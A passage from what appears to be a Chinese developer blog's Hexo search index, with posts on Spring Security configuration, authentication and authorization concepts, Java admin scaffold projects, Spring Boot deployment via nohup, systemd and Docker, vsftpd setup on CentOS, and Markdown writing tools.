id="认证原理"><a href="#认证原理" class="headerlink" title="认证原理"></a>认证原理</h3><ul><li>用户认证阶段<ul><li>用户名密码认证过滤器</li><li>初始化 AuthenticationManager</li><li>循环验证  AuthenticationProvider<ul><li>AnonymousAuthenticationProvider</li><li>DaoProvider</li><li>RememberMeAuthenticationProvider</li></ul></li></ul></li><li>凭证验证阶段<ul><li>获取 session 管理器</li><li>AccessDecisionManager 决定是否放行</li></ul></li></ul><h4 id="表单认证"><a href="#表单认证" class="headerlink" title="表单认证"></a>表单认证</h4><ul><li>spring security 会注册 filter 然后提供 login page</li><li>用户提交后命中 userpassword 过滤器</li><li>AuthenticationProvider 检查注册的 Provider</li></ul><h4 id="Token-无状态认证"><a href="#Token-无状态认证" class="headerlink" title="Token 无状态认证"></a>Token 无状态认证</h4><ul><li>设置 session 认证方式为无状态</li><li>每一次请求都拿从 redis、jwt 中取出的用户信息重新 auth 一次</li><li>无状态认证会带来一些性能的开销</li></ul><h2 id="security-注册的-filter"><a href="#security-注册的-filter" class="headerlink" title="security 注册的 filter"></a>security 注册的 filter</h2><p>在 FilterComparator 中可以找到</p><pre><code>    FilterComparator() {        Step order = new Step(INITIAL_ORDER, ORDER_STEP);        put(ChannelProcessingFilter.class, order.next());        put(ConcurrentSessionFilter.class, order.next());        put(WebAsyncManagerIntegrationFilter.class, order.next());        put(SecurityContextPersistenceFilter.class, order.next());        put(HeaderWriterFilter.class, order.next());        put(CorsFilter.class, order.next());        put(CsrfFilter.class, order.next());        put(LogoutFilter.class, order.next());        filterToOrder.put(            &quot;org.springframework.security.oauth2.client.web.OAuth2AuthorizationRequestRedirectFilter&quot;,                order.next());        put(X509AuthenticationFilter.class, order.next());        put(AbstractPreAuthenticatedProcessingFilter.class, order.next());        filterToOrder.put(&quot;org.springframework.security.cas.web.CasAuthenticationFilter&quot;,                order.next());        filterToOrder.put(            &quot;org.springframework.security.oauth2.client.web.OAuth2LoginAuthenticationFilter&quot;,                order.next());        put(UsernamePasswordAuthenticationFilter.class, order.next());        put(ConcurrentSessionFilter.class, order.next());        filterToOrder.put(                &quot;org.springframework.security.openid.OpenIDAuthenticationFilter&quot;, order.next());        put(DefaultLoginPageGeneratingFilter.class, order.next());        put(DefaultLogoutPageGeneratingFilter.class, order.next());        put(ConcurrentSessionFilter.class, order.next());        put(DigestAuthenticationFilter.class, order.next());        filterToOrder.put(                &quot;org.springframework.security.oauth2.server.resource.web.BearerTokenAuthenticationFilter&quot;, order.next());        put(BasicAuthenticationFilter.class, order.next());        put(RequestCacheAwareFilter.class, order.next());        put(SecurityContextHolderAwareRequestFilter.class, order.next());        put(JaasApiIntegrationFilter.class, order.next());        put(RememberMeAuthenticationFilter.class, order.next());        put(AnonymousAuthenticationFilter.class, order.next());        filterToOrder.put(            &quot;org.springframework.security.oauth2.client.web.OAuth2AuthorizationCodeGrantFilter&quot;,                order.next());        put(SessionManagementFilter.class, order.next());        put(ExceptionTranslationFilter.class, order.next());        put(FilterSecurityInterceptor.class, order.next());        put(SwitchUserFilter.class, order.next());    }</code></pre><h2 id="HttpSecurity-配置规则说明"><a href="#HttpSecurity-配置规则说明" class="headerlink" title="HttpSecurity 配置规则说明"></a>HttpSecurity 配置规则说明</h2><pre><code>protected void configure(HttpSecurity http) throws Exception {    http        .authorizeRequests()                                                                            .antMatchers(&quot;/resources/**&quot;, &quot;/signup&quot;, &quot;/about&quot;).permitAll()                              .antMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;)                                                  .antMatchers(&quot;/db/**&quot;).access(&quot;hasRole(&#39;ADMIN&#39;) and hasRole(&#39;DBA&#39;)&quot;)                        .anyRequest().authenticated()                                                               .and()        // ...        .formLogin();}</code></pre><ul><li>http.authorizeRequests()方法有多个子节点，每个macher按照他们的声明顺序执行。</li><li>我们指定任何用户都可以通过访问的多个URL模式。任何用户都可以访问URL以”/resources/“, equals “/signup”, 或者 “/about”开头的URL。</li><li>以 “/admin/“ 开头的URL只能由拥有 “ROLE_ADMIN”角色的用户访问。请注意我们使用 hasRole 方法，没有使用 “ROLE_” 前缀.</li><li>任何以”/db/“ 开头的URL需要用户同时具有 “ROLE_ADMIN” 和 “ROLE_DBA”。和上面一样我们的 hasRole 方法也没有使用 “ROLE_” 前缀.</li><li>尚未匹配的任何URL要求用户进行身份验证</li></ul><h2 id="JDBC-验证"><a href="#JDBC-验证" class="headerlink" title="JDBC 验证"></a>JDBC 验证</h2><pre><code>@Autowiredprivate DataSource dataSource;@Autowiredpublic void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {    auth        .jdbcAuthentication()            .dataSource(dataSource)            .withDefaultSchema()            .withUser(&quot;user&quot;).password(&quot;password&quot;).roles(&quot;USER&quot;).and()            .withUser(&quot;admin&quot;).password(&quot;password&quot;).roles(&quot;USER&quot;, &quot;ADMIN&quot;);}</code></pre><p>如果需要提供自己的验证器实现 AuthenticationProvider</p><pre><code>@Beanpublic SpringAuthenticationProvider springAuthenticationProvider() {    return new SpringAuthenticationProvider();}</code></pre><h2 id="UserDetailsService"><a href="#UserDetailsService" class="headerlink" title="UserDetailsService"></a>UserDetailsService</h2><pre><code>@Beanpublic SpringDataUserDetailsService springDataUserDetailsService() {    return new SpringDataUserDetailsService();}</code></pre><h2 id="定义密码加密方式"><a href="#定义密码加密方式" class="headerlink" title="定义密码加密方式"></a>定义密码加密方式</h2><pre><code>@Beanpublic BCryptPasswordEncoder passwordEncoder() {    return new BCryptPasswordEncoder();}</code></pre><h2 id="给方法添加权限检查-EnableGlobalMethodSecurity"><a href="#给方法添加权限检查-EnableGlobalMethodSecurity" class="headerlink" title="给方法添加权限检查 EnableGlobalMethodSecurity"></a>给方法添加权限检查 EnableGlobalMethodSecurity</h2><p>我们可以在任何使用@Configuration的实例上，使用@EnableGlobalMethodSecurity注解来启用基于注解的安全性。例如下面会启用Spring的@Secured注解。</p><pre><code>@EnableGlobalMethodSecurity(securedEnabled = true)public class MethodSecurityConfig {// ...}例如，通过  PreAuthorize 可以控制用户的访问 @PreAuthorize(&quot;hasRole(&#39;admin&#39;)&quot;) @RequestMapping(value = &quot;/user/&quot;, method = RequestMethod.GET) @ResponseBody public List&lt;User&gt; listAllUsers() {   List&lt;User&gt; users = userService.findAll();   if(users.isEmpty()){       return null;         }         return users; }</code></pre><h2 id="使用-token-方式鉴权"><a href="#使用-token-方式鉴权" class="headerlink" title="使用 token 方式鉴权"></a>使用 token 方式鉴权</h2><p><img src="/Spring/spring/spring-security/spring-security-jwt-authentication-architecture-diagram.png" alt=""></p><p>参考资料 <a href="https://grokonez.com/spring-framework/spring-security/spring-boot-spring-security-jwt-authentication-architecture-tutorial" target="_blank" rel="noopener">https://grokonez.com/spring-framework/spring-security/spring-boot-spring-security-jwt-authentication-architecture-tutorial</a></p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>关于Spring Security中无Session和无状态stateless <a href="https://www.cnblogs.com/Mainz/p/3230077.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mainz/p/3230077.html</a></li><li>SpringSecurity原理剖析与权限系统设计 <a href="https://www.cnblogs.com/fanzhidongyzby/archive/2019/09/29/11610334.html" target="_blank" rel="noopener">https://www.cnblogs.com/fanzhidongyzby/archive/2019/09/29/11610334.html</a></li><li>Spring Security用户认证流程源码详解 <a href="https://blog.csdn.net/qq_37142346/article/details/80032336" target="_blank" rel="noopener">https://blog.csdn.net/qq_37142346/article/details/80032336</a></li><li>中文文档 <a href="https://www.springcloud.cc/spring-security-zhcn.html#getting-starteda" target="_blank" rel="noopener">https://www.springcloud.cc/spring-security-zhcn.html#getting-starteda</a></li><li>Config Spring Security for Restful API <a href="https://www.baeldung.com/securing-a-restful-web-service-with-spring-security" target="_blank" rel="noopener">https://www.baeldung.com/securing-a-restful-web-service-with-spring-security</a></li><li><a href="https://spring.io/guides/gs/securing-web/" target="_blank" rel="noopener">https://spring.io/guides/gs/securing-web/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>认证和授权的基本概念</title>
      <link href="/%E5%AE%89%E5%85%A8/security/iam/"/>
      <url>/%E5%AE%89%E5%85%A8/security/iam/</url>
      
        <content type="html"><![CDATA[<h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>认证是 authentication，指的是当前用户的身份，当用户登陆过后系统便能追踪到他的身份做出符合相应业务逻辑的操作。即使用户没有登录，大多数系统也会追踪他的身份，只是当做来宾或者匿名用户来处理。认证技术解决的是 “我是谁？”的问题。</p><h2 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h2><p>授权是 authorization，指的是什么样的身份被允许访问某些资源，在获取到用户身份后继续检查用户的权限。单一的系统授权往往是伴随认证来完成的，但是在开放 API 的多系统结构下，授权可以由不同的系统来完成，例如 OAuth。授权技术是解决“我能做什么？”的问题。</p><h2 id="凭证"><a href="#凭证" class="headerlink" title="凭证"></a>凭证</h2><p>实现认证和授权的基础是需要一种媒介（credentials）来标记访问者的身份或权利，在现实生活中每个人都需要一张身份证才能访问自己的银行账户、结婚和办理养老保险等，这就是认证的凭证；在古代军事活动中，皇帝会给出战的将军颁发兵符，下级将领不关心持有兵符的人，只需要执行兵符对应的命令即可。在互联网世界中，服务器为每一个访问者颁发 session ID 存放到 cookie，这就是一种凭证技术。数字凭证还表现在方方面面，SSH 登录的密匙、JWT 令牌、一次性密码等。</p><h2 id="一些权限模型"><a href="#一些权限模型" class="headerlink" title="一些权限模型"></a>一些权限模型</h2><h3 id="RBAC"><a href="#RBAC" class="headerlink" title="RBAC"></a>RBAC</h3><p>RBAC  是基于角色的访问控制（Role-Based Access Control ）在 RBAC  中，权限与角色相关联，用户通过成为适当角色的成员而得到这些角色的权限。</p><h3 id="ABAC"><a href="#ABAC" class="headerlink" title="ABAC"></a>ABAC</h3><p>ABAC（Attribute Base Access Control） 基于属性的权限控制，用于解决权限和对象之间的关系，例如用户有创建贴吧的权限，但是删除某个贴吧，需要具体某个仓库的权限。</p><h2 id="IAM-设计检查清单"><a href="#IAM-设计检查清单" class="headerlink" title="IAM 设计检查清单"></a>IAM 设计检查清单</h2><ul><li>登录时把其他人挤下线</li><li>图形验证码</li><li>撤回和注销</li><li>密码修改</li><li>密码输入错误次数</li><li>用户锁定</li><li>检查密码是否过期</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://www.printf.cn/index.php/archives/api-authentication-authorization-credential.html" target="_blank" rel="noopener">http://www.printf.cn/index.php/archives/api-authentication-authorization-credential.html</a></li><li><a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/overview" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/azure/role-based-access-control/overview</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 一些开源后台管理种子项目</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-admin-projects/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-admin-projects/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我们做的业务系统大部分都是 xxx 管理系统，除了独有的业务逻辑之外，大部分都有一些公共的业务需求</p><ul><li>权限管理</li><li>登录登出</li><li>图片上传</li><li>列表</li><li>表单</li><li>支付</li><li>…</li></ul><p>于是很多人做了一些后台管理的脚手架，我整理了一些，吸收一些好的东西和方法到系统中。</p><h2 id="https-github-com-elunez-eladmin"><a href="#https-github-com-elunez-eladmin" class="headerlink" title="https://github.com/elunez/eladmin"></a><a href="https://github.com/elunez/eladmin" target="_blank" rel="noopener">https://github.com/elunez/eladmin</a></h2><p>项目基于 Spring Boot 2.1.0 、 Jpa、 Spring Security、redis、Vue的前后端分离的后台管理系统，项目采用分模块开发方式， 权限控制采用 RBAC，支持数据字典与数据权限管理，支持一键生成前后端代码，支持动态路由 </p><h2 id="https-github-com-white-cat-jeeweb"><a href="#https-github-com-white-cat-jeeweb" class="headerlink" title="https://github.com/white-cat/jeeweb"></a><a href="https://github.com/white-cat/jeeweb" target="_blank" rel="noopener">https://github.com/white-cat/jeeweb</a></h2><p>JEEWEB是一款基于SpringMVC+Spring+Hibernate的JAVA WEB敏捷开发系统；它是一款具有代码生成功能的智能快速开发平台；是以Spring Framework为核心容器，Spring MVC为模型视图控制器，Hibernate为数据访问层， Apache Shiro为权限授权层，Ehcahe对常用数据进行缓存，Disruptor作为并发框架，Bootstrap作为前端框架的优秀开源系统。</p><h2 id="https-github-com-lmxdawn-vue-admin-java"><a href="#https-github-com-lmxdawn-vue-admin-java" class="headerlink" title="https://github.com/lmxdawn/vue-admin-java"></a><a href="https://github.com/lmxdawn/vue-admin-java" target="_blank" rel="noopener">https://github.com/lmxdawn/vue-admin-java</a></h2><p>spring boot + mybatis + vue + element-ui 实现后台管理API接口</p><h2 id="https-gitee-com-xiandafu-springboot-plus"><a href="#https-gitee-com-xiandafu-springboot-plus" class="headerlink" title="https://gitee.com/xiandafu/springboot-plus"></a><a href="https://gitee.com/xiandafu/springboot-plus" target="_blank" rel="noopener">https://gitee.com/xiandafu/springboot-plus</a></h2><p>一个基于SpringBoot 2 的管理后台系统,有数十个基于此的商业应用，包含了用户管理，组织机构管理，角色管理，功能点管理，菜单管理，权限分配，数据权限分配，代码生成等功能 相比其他开源的后台开发平台脚手架，SpringBoot-Plus 使用简单，可以轻易完成中型，大型系统开发。</p><h2 id="https-github-com-yangzongzhuan-RuoYi"><a href="#https-github-com-yangzongzhuan-RuoYi" class="headerlink" title="https://github.com/yangzongzhuan/RuoYi"></a><a href="https://github.com/yangzongzhuan/RuoYi" target="_blank" rel="noopener">https://github.com/yangzongzhuan/RuoYi</a></h2><p>基于SpringBoot2.0的权限管理系统 易读易懂、界面简洁美观。 核心技术采用Spring、MyBatis、Shiro没有任何其它重度依赖。直接运行即可用。</p><h2 id="https-github-com-lihengming-spring-boot-api-project-seed"><a href="#https-github-com-lihengming-spring-boot-api-project-seed" class="headerlink" title="https://github.com/lihengming/spring-boot-api-project-seed"></a><a href="https://github.com/lihengming/spring-boot-api-project-seed" target="_blank" rel="noopener">https://github.com/lihengming/spring-boot-api-project-seed</a></h2><p>Spring Boot API Project Seed 是一个基于Spring Boot &amp; MyBatis的种子项目，用于快速构建中小型API、RESTful API项目，没有后台管理系统，只有一个 API。</p><h2 id="https-gitee-com-naan1993-guns"><a href="#https-gitee-com-naan1993-guns" class="headerlink" title="https://gitee.com/naan1993/guns/"></a><a href="https://gitee.com/naan1993/guns/" target="_blank" rel="noopener">https://gitee.com/naan1993/guns/</a></h2><p>Guns基于Spring Boot2，致力于做更简洁的后台管理系统。包含系统管理，代码生成，多数据库适配，SSO单点登录，工作流，短信，邮件发送，OAuth2登录，任务调度，持续集成，docker部署等功。支持Spring Cloud Alibaba微服务。社区活跃，版本迭代快，加群免费技术支持。</p><h2 id="https-github-com-paascloud-paascloud-master"><a href="#https-github-com-paascloud-paascloud-master" class="headerlink" title="https://github.com/paascloud/paascloud-master"></a><a href="https://github.com/paascloud/paascloud-master" target="_blank" rel="noopener">https://github.com/paascloud/paascloud-master</a></h2><p>spring cloud + vue + oAuth2.0全家桶实战，前后端分离模拟商城，完整的购物流程、后端运营平台，可以实现快速搭建企业级微服务项目。支持微信登录等三方登录。</p><h2 id="https-github-com-macrozheng-mall"><a href="#https-github-com-macrozheng-mall" class="headerlink" title="https://github.com/macrozheng/mall"></a><a href="https://github.com/macrozheng/mall" target="_blank" rel="noopener">https://github.com/macrozheng/mall</a></h2><p>mall项目是一套电商系统，包括前台商城系统及后台管理系统，基于SpringBoot+MyBatis实现。 前台商城系统包含首页门户、商品推荐、商品搜索、商品展示、购物车、订单流程、会员中心、客户服务、帮助中心等模块。 后台管理系统包含商品管理、订单管理、会员管理、促销管理、运营管理、内容管理、统计报表、财务管理、权限管理、设置等模块。</p>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 部署的几种方式</title>
      <link href="/Spring/spring/spring-boot-deploy/"/>
      <url>/Spring/spring/spring-boot-deploy/</url>
      
        <content type="html"><![CDATA[<h2 id="打包-Spring-Boot-应用"><a href="#打包-Spring-Boot-应用" class="headerlink" title="打包 Spring Boot 应用"></a>打包 Spring Boot 应用</h2><p>推荐使用 Spring Boot 的 jar 包进行部署，自带容器对环境依赖。当然也可以打包成 war 格式，并部署到 Servlet3.0 或者早期的 Servlet2.0 的容器中。</p><p>使用 Maven 或者 Gradle 打包 jar 文件,一般在工程中使用 wapper 构建。</p><p>可以通过 Initializr 构建一个基本的 SPring Boot 项目练习， <a href="https://start.spring.io/" target="_blank" rel="noopener">https://start.spring.io/</a> </p><h2 id="使用-Maven-构建"><a href="#使用-Maven-构建" class="headerlink" title="使用 Maven 构建"></a>使用 Maven 构建</h2><p>在 Maven 的 pom.xml 文件中配置如下插件。</p><pre><code>    &lt;build&gt;        &lt;plugins&gt;            ...            &lt;plugin&gt;                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;            &lt;/plugin&gt;        &lt;/plugins&gt;    &lt;/build&gt;</code></pre><p>在工程目录下的命令行运行 <code>./mvnw clean package</code></p><blockquote><p>./mvnw clean package </p></blockquote><p>构建成功后可以看到下面的信息。</p><pre><code>[INFO] --- maven-jar-plugin:3.1.2:jar (default-jar) @ spring-boot-boilerplate ---[INFO] Building jar: /Users/nlin/Downloads/spring-boot-boilerplate/target/spring-boot-boilerplate-0.0.1-SNAPSHOT.jar[INFO] [INFO] --- spring-boot-maven-plugin:2.2.1.RELEASE:repackage (repackage) @ spring-boot-boilerplate ---[INFO] Replacing main artifact with repackaged archive[INFO] ------------------------------------------------------------------------[INFO] BUILD SUCCESS[INFO] ------------------------------------------------------------------------[INFO] Total time:  4.237 s[INFO] Finished at: 2019-11-17T22:28:04+08:00[INFO] ------------------------------------------------------------------------</code></pre><h3 id="使用-gradle-构建"><a href="#使用-gradle-构建" class="headerlink" title="使用 gradle 构建"></a>使用 gradle 构建</h3><p>在 build.gradle 文件中有如下配置， org.springframework.boot 是用来运行和构建 Spring Boot 应用程序的，io.spring.dependency-management 是用来管理 Spring 项目各个依赖的版本，让其保持一致。</p><pre><code>plugins {    id &#39;org.springframework.boot&#39; version &#39;2.1.3.RELEASE&#39;    id &quot;io.spring.dependency-management&quot; version &quot;1.0.3.RELEASE&quot;}</code></pre><p>运行命令</p><blockquote><p>./gradle clean package </p></blockquote><p>我的项目名称是 spring-boot-boilerplate，因此制品是 spring-boot-boilerplate-0.0.1-SNAPSHOT.jar</p><h2 id="使用-Linux-命令-nohup-部署"><a href="#使用-Linux-命令-nohup-部署" class="headerlink" title="使用 Linux 命令 nohup 部署"></a>使用 Linux 命令 nohup 部署</h2><p>可以通过 <code>java -jar</code> 来运行 jar 文件，但是关闭窗口后会挂断应用程序，因此可以使用 <code>nohup</code> 来持续运行，需要注意的是使用 <code>nohup</code> 需要修改日志文件的流向 log.txt。</p><p>但 <code>nohup</code> 只是不挂断程序，不是指在后台运行，因此部署 Spring Boot 应用程序，还需要 <code>&amp;</code>。<code>&amp;</code> 指后台运行。</p><blockquote><p>nohup java -jar spring-boot-boilerplate-0.0.1-SNAPSHOT.jar &gt; log.txt &amp;</p></blockquote><p>这条需要在部署的服务器上运行，我们可以编写一个简单的 shell 脚本来完成。工作中，更多的是使用 ansible 脚本用于多台服务器批量操作。</p><p>先设置 ssh key，确保自己能使用 ssh 无密码能访问到目标服务器。然后通过 scp 拷贝文件到服务器。</p><blockquote><p> scp spring-boot-boilerplate-0.0.1-SNAPSHOT.jar <a href="mailto:root@192.168.1.86" target="_blank" rel="noopener">root@192.168.1.86</a>:/home/workspace</p></blockquote><p>192.168.1.86 为一台内网服务器地址。</p><p>然后通过远程执行 shell 脚本命令启动</p><blockquote><p> ssh <a href="mailto:root@192.168.1.86" target="_blank" rel="noopener">root@192.168.1.86</a> ‘nohup java -jar /home/workspace/spring-boot-boilerplate-0.0.1-SNAPSHOT.jar &gt; log.txt &amp;’</p></blockquote><p>启动之前需要杀死之前运行的 java 程序，否则会端口被占用。根据端口杀死占用的进程</p><blockquote><p>ssh <a href="mailto:root@192.168.1.86" target="_blank" rel="noopener">root@192.168.1.86</a> ‘output=$( netstat -apn | grep 8080 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;${output//[^0-9]/ } &amp;&amp; kill -9 $num5 || pwd’</p></blockquote><h2 id="通过注册服务运行"><a href="#通过注册服务运行" class="headerlink" title="通过注册服务运行"></a>通过注册服务运行</h2><p>上面的方法比较简单，但是有一个问题，部署之后如果服务器重启需要再次启动程序。可以将 <code>java -jar xxx.jar</code> 这条命令作为服务注册到系统中，也可以方便的提供启动、销毁的方法供系统启动的时候使用。 </p><p>可以使用 <code>systemd</code> 的一系列方法，同时 ansible 等自动化工具也提供了非常方便的 API。</p><p>创建一个 service 文件</p><blockquote><p>vim spring-boot-boilerplate.service </p></blockquote><p>然后添加配置。</p><pre><code>[Unit]Description=spring-boot-boilerplate java applicationAfter=syslog.target[Service]ExecStart=/usr/bin/nohup /usr/bin/java -jar /home/workspace/spring-boot-boilerplate.jar --spring.profiles.active=devSuccessExitStatus=143[Install]WantedBy=multi-user.target</code></pre><p>ExecStart 填写 java 应用启动命令，当 <code>systemctl start</code> 的时候会调用这个命令。注意依然需要使用 <code>nohup</code> 保持后台运行。</p><p>配置完成后拷贝 service 文件到系统目录</p><blockquote><p>mv spring-boot-boilerplate.service /usr/lib/systemd/system/spring-boot-boilerplate.service</p></blockquote><p>然后启动</p><blockquote><p>systemctl start spring-boot-boilerplate</p></blockquote><p>可以通过 <code>systemctl status</code> 查看状态，也能看到启动的日志，如果有错误这个时候能看到异常信息。</p><blockquote><p>systemctl status spring-boot-boilerplate</p></blockquote><p>另外，不要忘记允许开机启动。</p><blockquote><p>systemctl enable spring-boot-boilerplate</p></blockquote><h2 id="使用-docker-运行"><a href="#使用-docker-运行" class="headerlink" title="使用 docker 运行"></a>使用 docker 运行</h2><p>使用 docker 运行 Spring Boot 就非常简单了，编译完成 jar 文件之后，只需要编写一个 Dockerfile</p><blockquote><p>vim Dockerfile</p></blockquote><pre><code>FROM openjdk:8-jdk-slimVOLUME /tmpADD target/spring-boot-boilerplate.jar app.jarENTRYPOINT [&quot;java&quot;, &quot;-jar&quot;, &quot;/app.jar&quot;]</code></pre><p>cd 目录到当前目录下</p><blockquote><p>docker build -t spring-boot-docker  .</p></blockquote><p>使用 docker 查看构建出来的镜像</p><blockquote><p>docker images</p></blockquote><p>运行镜像，并将容器内端口（9999）映射到 8080</p><blockquote><p>docker run -it -p 9999:8080 spring-boot-docker</p></blockquote><p>如果单体机器可以直接使用 <code>nohup</code> 运行即可</p><blockquote><p>nohup docker run -it -p 9999:8080 spring-boot-docker &amp;</p></blockquote><p>如果需要部署集群，可以使用 swarm 和 kubernetes 构建弹性云系统。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://spring.io/guides/gs/spring-boot-docker/" target="_blank" rel="noopener">https://spring.io/guides/gs/spring-boot-docker/</a></li><li><a href="https://m.jb51.net/article/146105.htm" target="_blank" rel="noopener">https://m.jb51.net/article/146105.htm</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CentOS 搭建 vsftp</title>
      <link href="/linux/linux/linux-vsftpd/"/>
      <url>/linux/linux/linux-vsftpd/</url>
      
        <content type="html"><![CDATA[<h2 id="安装和启动"><a href="#安装和启动" class="headerlink" title="安装和启动"></a>安装和启动</h2><p>查看是否已经安装</p><blockquote><p>rpm -q vsftpd</p></blockquote><p>“package vsftpd is not installed” 说明没有安装。</p><blockquote><p>yum  install -y  vsftpd</p></blockquote><pre><code>Installed: vsftpd.x86_64 0:3.0.2-25.elComplete!</code></pre><blockquote><p>whereis  vsftpd</p></blockquote><p>vsftpd: /usr/sbin/vsftpd /etc/vsftpd /usr/share/man/man8/vsftpd.8.gz</p><p>启动服务</p><blockquote><p>systemctl start vsftpd</p></blockquote><p>如果需要允许随系统启动的话可以使用</p><blockquote><p>systemctl enable vsftpd</p></blockquote><h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><p>使用 </p><blockquote><p>systemctl status vsftpd</p></blockquote><p>查看配置文件地址和安装情况。</p><pre><code>vsftpd.service - Vsftpd ftp daemon   Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; disabled; vendor preset: disabled)   Active: active (running) since Sun 2019-11-17 15:56:40 CST; 4s ago  Process: 15115 ExecStart=/usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf (code=exited, status=0/SUCCESS) Main PID: 15118 (vsftpd)   CGroup: /system.slice/vsftpd.service           └─15118 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf</code></pre><p>编辑配置文件</p><blockquote><p>vim /etc/vsftpd/vsftpd.conf</p></blockquote><p>vsftp 的匿名用户默认目录为</p><blockquote><p>/var/ftp/pub</p></blockquote><h2 id="ftp-服务需要特别开启防火墙服务"><a href="#ftp-服务需要特别开启防火墙服务" class="headerlink" title="ftp 服务需要特别开启防火墙服务"></a>ftp 服务需要特别开启防火墙服务</h2><blockquote><p>firewall-cmd –permanent –zone=public –add-service=ftp<br>firewall-cmd –reload </p></blockquote><p>通过 ftp://{host} 访问</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>几种易于管理的写作排版方案</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-tool/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-tool/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>很长一段时间，我都在探索写作的排版方案。从大学开始做校报，使用过 Word、WPS、方正飞腾等用于报纸的排版系统。</p><p>到现在互联网写作，原来的方式不再适用了，特别是</p><ul><li>不要和样式捆绑，方便多平台发布</li><li>易于版本管理，最好是文本格式</li><li>方便生成 pdf、word、html 等多种格式</li></ul><p>探索出来对于互联网写作者来说，可以采用 markdown 作为写作格式，Git 或者 SVN 作为版本管理，使用一系列工具生成各种格式发布。</p><p>我收集和整理了一些工具，用于不同的写作场景。</p><h2 id="hexo-静态网站生成"><a href="#hexo-静态网站生成" class="headerlink" title="hexo 静态网站生成"></a>hexo 静态网站生成</h2><p>如果你是一前端开发者，熟悉 npm 的使用，你可以安装好 npm 后，安装 hexo</p><blockquote><p>npm install -g hexo-cli</p></blockquote><p>然后运行</p><pre><code>$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install</code></pre><p>就能看到生成的一个项目</p><pre><code>.├── _config.yml├── package.json├── scaffolds├── source|   ├── _drafts|   └── _posts└── themes</code></pre><p>然后在 <code>source/_posts</code> 添加文档即可（也可以用命令添加）。文档头部加入一些元数据，例如标题，分类等。</p><pre><code>---title: 几种易于管理的写作排版方案categories: 写作技巧toc: true---正文</code></pre><p>最后使用命令，<code>hexo generate</code> 即可生成你想要的静态网站。</p><blockquote><p>hexo generate</p></blockquote><p>你可以参考官网文档：<a href="https://hexo.io" target="_blank" rel="noopener">https://hexo.io</a>  进行配置和使用更多命令。另外需要注意图片的问题，你可以安装一个插件即可。</p><p>插件地址：</p><p><a href="https://github.com/CodeFalling/hexo-asset-image.git" target="_blank" rel="noopener">https://github.com/CodeFalling/hexo-asset-image.git</a></p><p>我用这套东西，搭建了一个自己的知识系统，用了另外一个网友的主题，这里表示感谢：</p><p><a href="https://github.com/linksgo2011/wiki" target="_blank" rel="noopener">https://github.com/linksgo2011/wiki</a></p><h2 id="pandoc"><a href="#pandoc" class="headerlink" title="pandoc"></a>pandoc</h2><p>如果你只想简单的将 markdown 文章转成 html、pdf、epub，可以使用一个工具叫做</p><p><code>pandoc</code></p><p>使用 Mac 或者 Linux 同学可以通过编写 shell 脚本或者 Makefile 实现，对想写电子书的同学非常方便。</p><pre><code>html:     pandoc -s $(filename).md -t html5 -o index.html \        --title-prefix $(title) \        --tocepub:     pandoc -s $(filename).md --normalize --smart -t epub -o $(filename).epub --tocrtf:     pandoc -s $(filename).md -o $(filename).rtf \        --title-prefix $(title) \        --normalize \        --smartpdf:     pandoc -s $(filename).md -o $(filename).pdf \        --title-prefix $(title) \        --toc \        --latex-engine=`which xelatex`</code></pre><h2 id="gitbook"><a href="#gitbook" class="headerlink" title="gitbook"></a>gitbook</h2><p>对于没有编程经验，但是也想版本话管理自己的作品，可以使用 <a href="https://www.gitbook.com/" target="_blank" rel="noopener">https://www.gitbook.com/</a> 网上非常多的教程可以参考。</p><h2 id="Sphinx-和-LaTeX"><a href="#Sphinx-和-LaTeX" class="headerlink" title="Sphinx 和 LaTeX"></a>Sphinx 和 LaTeX</h2><p>对于专业写作者，尤其是需要编写公式的写作者。Sphinx 和 LaTeX 是非常好的一套方案。</p><ul><li>Sphinx 是一套专业的文档管理工具，很多开源软件和出版社使用这套工具</li><li>LaTeX 是一套公式编写工具，通过文本的编写格式，生成图形化的公式</li></ul><p>使用 Sphinx 的编写的文档示例参考</p><p><a href="http://www.sphinx-doc.org/en/stable/examples.html" target="_blank" rel="noopener">http://www.sphinx-doc.org/en/stable/examples.html</a></p><h2 id="其他资源"><a 